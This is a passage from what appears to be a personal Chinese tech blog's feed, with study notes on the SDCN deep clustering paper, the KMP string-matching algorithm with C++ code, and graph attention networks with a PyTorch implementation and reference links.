(众所周知，<code>结构信息表明数据样本之间的潜在相似性</code>。然而，数据的结构通常非常复杂，即<code>不仅存在样本之间的直接关系（也称为一阶结构）</code>，而且<code>还存在高阶结构</code>。</p><p><strong>以<code>二阶结构为例</code>**，这意味着对于</strong><code>没有直接关系的两个样本</code><strong>，如果</strong>它们<code>有很多共同的邻居样本</code><strong>，它们</strong><code>应该仍然具有相似的表示</code>**。仅在深度聚类中利用<code>低阶结构是远远不够的</code>，如何有<code>效地考虑高阶结构是首要问题</code>；</p><p>本篇论文如何解决：</p><p>为了捕获结构信息，我们<code>首先构建了一个 K 最近邻 (KNN) 图</code>，它能够揭示数据的底层结构。为了<code>从 KNN 图中捕获低阶和高阶结构信息</code>，我们提出了<code>一个由多个图卷积层组成的 GCN 模块，以学习 GCN 特定的表示。</code></p><blockquote><ol start="2"><li>结构信息和深度聚类之间的关系是什么？</li></ol></blockquote><p><code>深度聚类的基本组成部分是深度神经网络 (DNN)</code>，例如自动编码器。<code>自编码器的网络架构非常复杂，由多层组成。每层捕获不同的潜在信息。并且数据之间还存在各种类型的结构信息</code>。那么，autoencoder中不同结构和不同层之间的关系是什么？<code>可以使用结构以某种方式对自动编码器学习的表示进行正则化</code>，但是，另一方面，也可以直接从结构本身学习表示。</p><p>本篇论文如何解决：</p><p>为了将结构信息引入深度聚类，我们引入了<code>一个自动编码器模块</code>来从<code>原始数据中学习自动编码器特定的表示</code>。</p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><h3 id="1-模型架构图"><a href="#1-模型架构图" class="headerlink" title="1. 模型架构图"></a>1. 模型架构图</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201413345.png" alt="image-20230315143854736"></p><p>从<strong>模型框架中可以看出该模型主要包含四个模块</strong>：<strong>KNN模块、DNN模块、GCN模块和双重自监督模块</strong>。</p><ol><li><strong>我们首先基于（非图数据）原始数据构建 KNN 图。如果是图数据直接输入到GCN</strong></li><li><strong>然后我们将原始数据和 KNN 图分别输入自动编码器和 GCN。</strong></li><li><strong>然后我们将自动编码器的每一层与相应的 GCN 层连接起来，将自动编码器特定的表示结构感知表示中。</strong></li><li><strong>最后，我们通过了一种双重自监督机制来监督自动编码器和 GCN 的训练进度</strong></li></ol><h3 id="2-模型模块详细介绍"><a href="#2-模型模块详细介绍" class="headerlink" title="2. 模型模块详细介绍"></a>2. 模型模块详细介绍</h3><h4 id="1-KNN模块"><a href="#1-KNN模块" class="headerlink" title="1.KNN模块"></a>1.KNN模块</h4><p>该模块主要是对非图数据进行处理，通过K近邻算法构建一个K近邻的图，首先要构造相似性矩阵，从相似性矩阵中选择节点前K个作为邻居。：　根据节点特征　计算任意节点之间的相似度关系，选择与自身最大的ｋ个连接成边。</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201413546.png" alt="image-20230315145504207"></p><h4 id="2-DNN-模块：-自动编码器AE"><a href="#2-DNN-模块：-自动编码器AE" class="headerlink" title="2.DNN 模块： 自动编码器AE"></a>2.DNN 模块： 自动编码器AE</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201413634.png" alt="image-20230315152157602"></p><h4 id="3-GCN模块"><a href="#3-GCN模块" class="headerlink" title="3. GCN模块"></a>3. GCN模块</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201413062.png" alt="image-20230315161441574"> <img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201413515.png" alt="image-20230315162713623"></p><h4 id="4-双重自监督模块"><a href="#4-双重自监督模块" class="headerlink" title="4.双重自监督模块"></a>4.双重自监督模块</h4><blockquote><ol><li>第一重自监督模块</li></ol></blockquote><p>​    我们使用<strong>t-分布</strong>来衡量<strong>嵌入节点Hi</strong> 和<strong>簇中心节点Uj</strong> 之间的相似性。</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201414696.png" alt="image-20230315222043866"></p><p>其他论文中公式：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201414500.png" alt="image-20230308105502219"></p><p>*<strong>qij表示节点i属于簇j的概率，将其看作是每个节点的软聚类分配标签，如果值越大，那么可信度越高</strong> 。通过平方运算将这种可信度放大：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201414641.png" alt="image-20230315162906791"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201414895.png" alt="image-20230315165412843"></p><p>自训练聚类模块的损失函数采用KL 散度：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201414313.png" alt="image-20230315162923459"></p><p><strong>聚类损失然后迫使当前分布 Q 逼近目标分布 P ，从而将这些“置信分配”设置为软标签来监督 Q 的嵌入学习</strong></p><blockquote><ol start="2"><li>第二重自监督模块</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201414053.png" alt="image-20230315221527375"></p><p><strong>目标函数优势：</strong></p><p>（1）与传统的<code>多分类损失函数</code>相比，<code>KL散度以更“温和”的方式更新整个模型</code>，防止数据表示受到严重扰动；</p><p> (2) <code>GCN和DNN模块都统一在同一个优化目标上</code>，使得它们的结果在训练过程中趋于一致。因为D<code>NN模块和GCN模块的目标是逼近目标分布P</code>，这两个模块之间有很强的联系，所以我们称之为<code>双重自监督机制</code>。</p><h4 id="5-SCDN-损失函数"><a href="#5-SCDN-损失函数" class="headerlink" title="5. SCDN 损失函数"></a>5. SCDN 损失函数</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201414451.png" alt="image-20230315222211636"></p><h4 id="6-SCDN-算法流程"><a href="#6-SCDN-算法流程" class="headerlink" title="6.SCDN 算法流程"></a>6.SCDN 算法流程</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201414193.png" alt="image-20230315222808748"></p><h4 id="7-SCDN实验结果"><a href="#7-SCDN实验结果" class="headerlink" title="7. SCDN实验结果"></a>7. SCDN实验结果</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201414033.png" alt="image-20230316111630188"></p><ol><li>我们的方法 SDCN 和 SDCNQ 在所有六个数据集中都取得了最好的结果,原因是 <code>SDCN 成功地将结构信息整合到深度聚类中，双自监督模块引导自编码器和 GCN 的更新，使它们相互增强。</code></li><li><code>SDCN 通常比 SDCNQ 获得更好的聚类结果</code>。原因是 S<code>DCN 使用包含 GCN 学习的结构信息的表示，而 SDCNQ类似于DAEGC 主要使用自动编码器学习的表示</code>。在Reuters数据集上============应用GCN的一个重要前提是构建噪声较小的KNN图。</li></ol><h3 id="3-实验数据详细分析"><a href="#3-实验数据详细分析" class="headerlink" title="3. 实验数据详细分析"></a>3. 实验数据详细分析</h3><h4 id="1-变体分析："><a href="#1-变体分析：" class="headerlink" title="1.变体分析："></a>1.变体分析：</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201414887.png" alt="image-20230319154446755"></p><p><strong>和两种变体相比，SDCN 都取得了最好的性能。这证明了SDCN中的交替传递算子和 GCN 在提高聚类质量方面都发挥了重要作用。</strong></p><h4 id="2-传播层数分析"><a href="#2-传播层数分析" class="headerlink" title="2. 传播层数分析"></a>2. 传播层数分析</h4><p>为了研究 SDCN 是否受益于多层 GCN，我们改变了 GCN 模块的深度，同时保持 DNN 模块不变。</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201414762.png" alt="image-20230319155454166"></p><p>结果分析：</p><ol><li>增加 SDCN 的GCN深度可以显着提高聚类性能。由于autoencoder中每一层学习到的representations不同，为了尽可能的保留信息，我们需要将autoencoder中学习到的representations全部放到对应的GCN层中。</li><li>scdn-2 比scdn-3的效果好。 1. 存在SDCN-3存在图过平滑问题，2. SDCN-3它使用的是H(2)，是编码器的中间层。该层生成的表示处于从原始数据到语义表示的过渡阶段，不可避免地会丢失一些底层信息，缺乏语义信息</li></ol><h4 id="3-AE输入到GCN中的交替算子中平衡因子"><a href="#3-AE输入到GCN中的交替算子中平衡因子" class="headerlink" title="3. AE输入到GCN中的交替算子中平衡因子"></a>3. AE输入到GCN中的交替算子中平衡因子</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201414652.png" alt="image-20230319155826172"></p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201415611.png" alt="image-20230319155849673"></p><p>  结果分析：</p><ol><li><p>发现平衡因子为0.5时效果最好：在四个数据集（Reuters、ACM、DBLP、Citeseer）中参数 ε = 0.5 的聚类精度达到最佳性能，这<strong>表明 GCN 模块和 DNN 模块的表示同等重要</strong>，SDCN 的改进取决于相互增强两个模块。</p></li><li><p> <strong>ε =0，时为标准的GCN模型，存在过渡平滑现象</strong>，与<strong>ε =1相比</strong>，我们可以<strong>发现即使将自动编码器学习到的少量表示注入 GCN 也有助于缓解过度平滑问题</strong></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> 深度聚类 </tag>
            
            <tag> 图深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据集处理</title>
      <link href="/2023/03/08/%E6%95%B0%E6%8D%AE%E9%9B%86%E5%A4%84%E7%90%86/"/>
      <url>/2023/03/08/%E6%95%B0%E6%8D%AE%E9%9B%86%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><a href="https://developer.aliyun.com/article/1138200">在torch_geometric.datasets中使用Planetoid手动导入Core数据集及发生相关错误解决方案-阿里云开发者社区 (aliyun.com)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>KMP</title>
      <link href="/2023/03/07/KMP/"/>
      <url>/2023/03/07/KMP/</url>
      
        <content type="html"><![CDATA[<h1 id="KMP-字符串快速匹配"><a href="#KMP-字符串快速匹配" class="headerlink" title="KMP 字符串快速匹配"></a>KMP 字符串快速匹配</h1><h2 id="1-算法思想"><a href="#1-算法思想" class="headerlink" title="1. 算法思想"></a>1. 算法思想</h2><p><strong>当出现字符串不匹配时，可以知道一部分之前已经匹配的文本内容，可以利用这些信息避免从头再去做匹配了</strong></p><p><code>所以如何记录已经匹配的文本内容，是KMP的重点，也是next数组肩负的重任</code></p><h2 id="2-KMP前缀表"><a href="#2-KMP前缀表" class="headerlink" title="2.  KMP前缀表"></a>2.  KMP前缀表</h2><blockquote><ol><li>前缀表作用</li></ol></blockquote><p><strong>前缀表是用来回退的，它记录了模式串与主串(文本串)不匹配的时候，模式串应该从哪里开始重新匹配</strong></p><blockquote><ol start="2"><li>前缀表如何记录</li></ol></blockquote><p>首先要知道<code>前缀表的任务</code>是当前位置匹配失败，<code>找到之前已经匹配上的位置</code>，再重新匹配，此也<code>意味着在某个字符失配时</code>，<code>前缀表会告诉你下一步匹配中</code>，<code>模式串应该跳到哪个位置</code>。</p><blockquote><ol start="3"><li>前缀表记录数据意义</li></ol></blockquote><p><strong>记录下标i之前（包括i）的字符串中，有多大长度的<code>相同前缀后缀</code></strong></p><h2 id="3-前缀和后缀"><a href="#3-前缀和后缀" class="headerlink" title="3. 前缀和后缀"></a>3. 前缀和后缀</h2><p>字符串的**<code>前缀</code>是指<code>不包含最后一个字符</code>的<code>所有以第一个字符开头的连续子串</code>**</p><p>**<code>后缀</code>是指<code>不包含第一个字符</code>的<code>所有以最后一个字符结尾的连续子串</code>**。</p><p><strong>注意事项：</strong></p><p><code>KMP 中前缀表</code>要求的是<code>相同前后缀的长度</code>。</p><h2 id="4-求前缀表和使用"><a href="#4-求前缀表和使用" class="headerlink" title="4. 求前缀表和使用"></a>4. 求前缀表和使用</h2><blockquote><ol><li>求前缀表</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201420864.png" alt="image-20230307161910833"></p><blockquote><ol start="2"><li>前缀表在使用</li></ol></blockquote><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201420593.png" alt="image-20230307162939331"></p><h2 id="5-KMP-代码实现"><a href="#5-KMP-代码实现" class="headerlink" title="5. KMP 代码实现"></a>5. KMP 代码实现</h2><h3 id="1-Next数组：前缀表"><a href="#1-Next数组：前缀表" class="headerlink" title="1. Next数组：前缀表"></a>1. Next数组：前缀表</h3><pre class=" language-c++"><code class="language-c++"> void getNext(int* next, const string& s) &#123;     /*     参数 i，j解释     i ： 指向后缀末尾位置  i=1       j ： 指向前缀末尾位置  j=0    还表示i 之前包含i这个字串最长相等前后缀的长度     我们要比较前缀和和后缀最长公共长度：     所以i=1 ,j=0 这个时候才可以比较。          next 前缀表过程     1. 初始化     2. 前后缀不同     3. 前后缀相同          */        int j = 0;        next[0] = 0;// 一个字符最长前后缀公共长度为0        for(int i = 1; i < s.size(); i++) &#123;            while (j > 0 && s[i] != s[j]) &#123; // j要保证大于0，因为下面有取j-1作为数组下标的操作                j = next[j - 1]; // 注意这里，是要找前一位的对应的回退位置了                // 解释：kmp 匹配过程中碰到匹配不符合时候会看前一位的。这个和那个类似            &#125;            if (s[i] == s[j]) &#123;                j++;            &#125;            next[i] = j;        &#125;    &#125;</code></pre><h3 id="2-KMP匹配：找到模式串在文本串中第一次出现的位置"><a href="#2-KMP匹配：找到模式串在文本串中第一次出现的位置" class="headerlink" title="2. KMP匹配：找到模式串在文本串中第一次出现的位置"></a>2. KMP匹配：找到模式串在文本串中第一次出现的位置</h3><pre class=" language-c++"><code class="language-c++">int strStr(string haystack, string needle) &#123;        if (needle.size() == 0) &#123;            return 0;        &#125;        int next[needle.size()];        getNext(next, needle);        int j = 0;        for (int i = 0; i < haystack.size(); i++) &#123;            while(j > 0 && haystack[i] != needle[j]) &#123;                j = next[j - 1];            &#125;            if (haystack[i] == needle[j]) &#123;                j++;            &#125;            if (j == needle.size() ) &#123;                return (i - needle.size() + 1);            &#125;        &#125;        return -1;    &#125;&#125;;</code></pre><h2 id="6-KMP复杂度分析"><a href="#6-KMP复杂度分析" class="headerlink" title="6. KMP复杂度分析"></a>6. KMP复杂度分析</h2><ul><li>时间复杂度O(M+N)，</li><li>空间复杂度为O(M)</li></ul><h2 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7. 参考链接"></a>7. 参考链接</h2><p><a href="https://www.bilibili.com/video/BV1M5411j7Xx/?spm_id_from=pageDriver&vd_source=5e8f069711510b3788382a0a03ff38e5">帮你把KMP算法学个通透！（求next数组代码篇）_哔哩哔哩_bilibili</a></p><p><a href="https://programmercarl.com/0028.%E5%AE%9E%E7%8E%B0strStr.html#%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%89%88%E6%9C%AC">代码随想录 (programmercarl.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GAT</title>
      <link href="/2023/03/07/GAT/"/>
      <url>/2023/03/07/GAT/</url>
      
        <content type="html"><![CDATA[<h1 id="GAT-图注意力"><a href="#GAT-图注意力" class="headerlink" title="GAT 图注意力"></a>GAT 图注意力</h1><h2 id="1-图数据结构两种特征"><a href="#1-图数据结构两种特征" class="headerlink" title="1. 图数据结构两种特征"></a>1. 图数据结构两种特征</h2><h3 id="1-图结构特征"><a href="#1-图结构特征" class="headerlink" title="1.图结构特征"></a>1.图结构特征</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201417643.png" alt="image-20230307200830089"></p><h3 id="2-节点自己特征"><a href="#2-节点自己特征" class="headerlink" title="2. 节点自己特征"></a>2. 节点自己特征</h3><p><strong>除了图的结构之外**</strong>，每个<code>顶点还有自己的特征 ℎi</code>（通常是一个高维向量）。**<code>它可以使社交网络中每个用户的个体属性</code>；可以是生物网络中，每个蛋白质的性质；还可以使交通路网中，每个交叉口的车流量。</p><h2 id="2-GAT-计算过程"><a href="#2-GAT-计算过程" class="headerlink" title="2. GAT  计算过程"></a>2. GAT  计算过程</h2><h3 id="1-注意力系数-attentio-coeffiecient"><a href="#1-注意力系数-attentio-coeffiecient" class="headerlink" title="1. 注意力系数 attentio  coeffiecient"></a>1. 注意力系数 attentio  coeffiecient</h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201417413.png" alt="image-20230307203205573"></p><h3 id="2-加权求和（aggregate）"><a href="#2-加权求和（aggregate）" class="headerlink" title="2. 加权求和（aggregate）"></a>2. <strong>加权求和（aggregate）</strong></h3><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201417402.png" alt="image-20230307203800447"></p><h2 id="3-单层的GAT-代码实现"><a href="#3-单层的GAT-代码实现" class="headerlink" title="3. 单层的GAT 代码实现"></a>3. 单层的GAT 代码实现</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn <span class="token keyword">as</span> nn<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>functional <span class="token keyword">as</span> F<span class="token keyword">class</span> <span class="token class-name">GATLayer</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> in_features<span class="token punctuation">,</span> out_features<span class="token punctuation">,</span> dropout<span class="token punctuation">,</span> alpha<span class="token punctuation">,</span> concat<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>GATLayer<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>dropout <span class="token operator">=</span> dropout  <span class="token comment" spellcheck="true"># dropout参数</span>        self<span class="token punctuation">.</span>in_features <span class="token operator">=</span> in_features  <span class="token comment" spellcheck="true"># 节点向量的特征维度</span>        self<span class="token punctuation">.</span>out_features <span class="token operator">=</span> out_features  <span class="token comment" spellcheck="true"># 经过GAT之后的特征维度</span>        self<span class="token punctuation">.</span>alpha <span class="token operator">=</span> alpha  <span class="token comment" spellcheck="true"># LeakyReLU参数 GAT 中设置0.2</span>        self<span class="token punctuation">.</span>concat <span class="token operator">=</span> concat  <span class="token comment" spellcheck="true"># 如果为true, 再进行elu激活</span>        <span class="token comment" spellcheck="true"># 定义可训练参数，即论文中的W和a</span>        self<span class="token punctuation">.</span>W <span class="token operator">=</span> nn<span class="token punctuation">.</span>Parameter<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>empty<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token punctuation">(</span>in_features<span class="token punctuation">,</span> out_features<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 输入特征h是N I  w为 I O</span>        nn<span class="token punctuation">.</span>init<span class="token punctuation">.</span>xavier_uniform_<span class="token punctuation">(</span>self<span class="token punctuation">.</span>W<span class="token punctuation">.</span>data<span class="token punctuation">,</span> gain<span class="token operator">=</span><span class="token number">1.414</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># xavier初始化</span>        self<span class="token punctuation">.</span>a <span class="token operator">=</span> nn<span class="token punctuation">.</span>Parameter<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>empty<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> out_features<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># wh之后为N0</span>        nn<span class="token punctuation">.</span>init<span class="token punctuation">.</span>xavier_uniform_<span class="token punctuation">(</span>self<span class="token punctuation">.</span>a<span class="token punctuation">.</span>data<span class="token punctuation">,</span> gain<span class="token operator">=</span><span class="token number">1.414</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># xavier初始化</span>        <span class="token comment" spellcheck="true"># 定义leakyReLU激活函数</span>        self<span class="token punctuation">.</span>leakyrelu <span class="token operator">=</span> nn<span class="token punctuation">.</span>LeakyReLU<span class="token punctuation">(</span>self<span class="token punctuation">.</span>alpha<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> h<span class="token punctuation">,</span> adj<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''        adj图邻接矩阵，维度[N,N]非零即一        h.shape: (N, in_features), self.W.shape:(in_features,out_features)        Wh.shape: (N, out_features)        '''</span>        Wh <span class="token operator">=</span> torch<span class="token punctuation">.</span>mm<span class="token punctuation">(</span>h<span class="token punctuation">,</span> self<span class="token punctuation">.</span>W<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 计算wh值 Wh.shape: (N, out_features)</span>        <span class="token comment" spellcheck="true"># Wh.shape (N, out_feature)</span>        <span class="token comment" spellcheck="true"># self.a.shape (2 * out_feature, 1)</span>        <span class="token comment" spellcheck="true"># Wh1&amp;2.shape (N, 1)</span>        <span class="token comment" spellcheck="true"># e.shape (N, N)</span>        Wh1 <span class="token operator">=</span> torch<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>Wh<span class="token punctuation">,</span> self<span class="token punctuation">.</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>out_features<span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 计算a和whi</span>        Wh2 <span class="token operator">=</span> torch<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>Wh<span class="token punctuation">,</span> self<span class="token punctuation">.</span>a<span class="token punctuation">[</span>self<span class="token punctuation">.</span>out_features<span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># a和whj</span>        <span class="token comment" spellcheck="true"># broadcast add</span>        e <span class="token operator">=</span> self<span class="token punctuation">.</span>leakyrelu<span class="token punctuation">(</span>Wh1 <span class="token operator">+</span> Wh2<span class="token punctuation">.</span>T<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 拼接输入到leakyrelu</span>        zero_vec <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">9e15</span> <span class="token operator">*</span> torch<span class="token punctuation">.</span>ones_like<span class="token punctuation">(</span>e<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 将没有链接的边设置为负无穷</span>        attention <span class="token operator">=</span> torch<span class="token punctuation">.</span>where<span class="token punctuation">(</span>adj <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> zero_vec<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># [N,N]</span>        <span class="token comment" spellcheck="true"># 表示如果邻接矩阵元素大于0时，则两个节点有连接，该位置的注意力系数保留</span>        <span class="token comment" spellcheck="true"># 否则需要mask设置为非常小的值，因为softmax的时候这个最小值会不考虑</span>        attention <span class="token operator">=</span> F<span class="token punctuation">.</span>softmax<span class="token punctuation">(</span>attention<span class="token punctuation">,</span> dim<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># softmax形状保持不变[N,N]，得到归一化的注意力全忠！</span>        attention <span class="token operator">=</span> F<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>attention<span class="token punctuation">,</span> self<span class="token punctuation">.</span>dropout<span class="token punctuation">,</span> training<span class="token operator">=</span>self<span class="token punctuation">.</span>training<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># dropout,防止过拟合</span>        h_prime <span class="token operator">=</span> torch<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>attention<span class="token punctuation">,</span> Wh<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># [N,N].[N,out_features]=>[N,out_features]</span>        <span class="token comment" spellcheck="true"># 得到由周围节点通过注意力权重进行更新后的表示</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>concat<span class="token punctuation">:</span>            <span class="token keyword">return</span> F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>h_prime<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> h_prime    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__name__ <span class="token operator">+</span> <span class="token string">' ('</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>self<span class="token punctuation">.</span>in_features<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' -> '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>self<span class="token punctuation">.</span>out_features<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">')'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># x = torch.randn(6, 10)</span>    <span class="token comment" spellcheck="true"># adj = torch.tensor([[0, 1, 1, 0, 0, 0],</span>    <span class="token comment" spellcheck="true">#                     [1, 0, 1, 0, 0, 0],</span>    <span class="token comment" spellcheck="true">#                     [1, 1, 0, 1, 0, 0],</span>    <span class="token comment" spellcheck="true">#                     [0, 0, 1, 0, 1, 1],</span>    <span class="token comment" spellcheck="true">#                     [0, 0, 0, 1, 0, 0, ],</span>    <span class="token comment" spellcheck="true">#                     [0, 0, 0, 1, 1, 0]])</span>    <span class="token comment" spellcheck="true"># my_gat = GATLayer(10, 5, 0.2, 0.2)</span>    x <span class="token operator">=</span> torch<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>    adj <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                        <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>                        <span class="token punctuation">]</span><span class="token punctuation">)</span>    my_gat <span class="token operator">=</span> GATLayer<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0.2</span><span class="token punctuation">,</span> <span class="token number">0.2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>my_gat<span class="token punctuation">(</span>x<span class="token punctuation">,</span> adj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ————————————————</span><span class="token comment" spellcheck="true"># 版权声明：本文为CSDN博主「锵锵锵锵~蒋」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span><span class="token comment" spellcheck="true"># 原文链接：https://blog.csdn.net/weixin_43629813/article/details/129278266</span></code></pre><p>参考链接：</p><p><a href="https://zhuanlan.zhihu.com/p/592857570">图神经网络-图注意力（GAT）详解及代码实现 - 知乎 (zhihu.com)</a></p><p><a href="https://www.bilibili.com/video/BV1wP411T7dr/">https://www.bilibili.com/video/BV1wP411T7dr/</a></p><p><a href="https://blog.csdn.net/weixin_43629813/article/details/129278266">(39条消息) 图注意网络GAT理解及Pytorch代码实现【PyGAT代码详细注释】_gat代码解读_锵锵锵锵~蒋的博客-CSDN博客</a></p><p><a href="https://www.bilibili.com/video/BV1wP411T7dr/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">图神经网络系列讲解及代码实现-GAT 1_哔哩哔哩_bilibili</a></p><p><a href="https://blog.csdn.net/weixin_43629813/article/details/129278266">(39条消息) 图注意网络GAT理解及Pytorch代码实现【PyGAT代码详细注释】_gat代码解读_锵锵锵锵~蒋的博客-CSDN博客</a></p><h2 id="4-GATV2-GAT的修改"><a href="#4-GATV2-GAT的修改" class="headerlink" title="4. GATV2 (GAT的修改)"></a>4. GATV2 (GAT的修改)</h2><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201417645.png" alt="image-20230307204919334"></p><p>参考链接:[<a href="https://blog.csdn.net/adreammaker/article/details/128237743">论文导读] GATv2: 《how attentive are graph attention network?》ICLR2022_鱼与钰遇雨的博客-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/545773430">ICLR 2022 更强大的GAT(GATv2)! - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/m0_47256162/article/details/127939970">【图神经网络论文整理】（二）—— HOW ATTENTIVE ARE GRAPH ATTENTION NETWORKS?：GATv2_༺࿈ 海洋༒之心 ࿈༻的博客-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/574133050">26.How attentive are graph attention networks? - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/404826711">图卷积：从GCN到GAT、GraphSAGE - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/376140518">图神经网络13-图注意力模型GAT网络详解 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/weixin_43734080/article/details/127448525">(39条消息) 图卷积神经网络GCN、GAT的原理及Pytorch实现_gat 